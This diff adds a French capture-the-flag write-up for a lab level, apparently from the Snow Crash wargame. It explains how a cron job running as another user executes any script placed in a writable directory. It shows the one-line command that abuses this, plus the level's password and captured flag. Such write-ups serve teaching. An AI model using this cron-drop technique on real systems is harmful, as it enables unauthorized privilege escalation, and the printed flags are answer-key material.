@@ -1,0 +1,28 @@
+Pour se connecter a level05 utilisez ne2searoevaevoem4ov4ar8ap
+
+On remarque en se connectant, que nous avons reçu un nouveau mail,
+pour le lire on va devoir aller dans /var/mail/level105
+
+Son contenu */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Apres une recherche google, on remarque que */2 * * * * est une expression cron
+qui signifie que toute les 2mins, le programme openarenaserver va etre executer.
+
+Le contenu de openarenaserver:
+```
+    #!/bin/sh
+
+    for i in /opt/openarenaserver/* ; do
+            (ulimit -t 5; bash -x "$i")
+            rm -f "$i"
+    done
+```
+
+Ce programme va simplement executer tous les fichiers presents
+dans le dossier /opt/openarenaserver/
+
+Donc pour cela on va juste indiquer dans un fichier que nous allons mettre dans openarenaserver
+que nous voudrions la sortie de getflag dans le dossier /tmp/password par exemple pour pouvoir lire le flag:
+    - echo "getflag > /tmp/password" > /opt/openarenaserver/exploit
+
+On peut ensuite récuperer le flag dans /tmp/password : viuaaale9huek52boumoomioc
